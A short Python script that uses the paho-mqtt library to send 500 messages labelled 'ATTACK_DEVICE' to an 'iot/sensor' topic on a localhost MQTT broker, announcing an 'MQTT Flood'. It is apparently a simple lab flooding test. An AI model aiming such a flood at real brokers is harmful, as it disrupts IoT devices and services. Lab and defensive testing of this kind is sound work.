import paho.mqtt.publish as publish

for i in range(500):

    publish.single(
        "iot/sensor",
        "ATTACK_DEVICE",
        hostname="localhost"
    )

print("MQTT Flood Sent")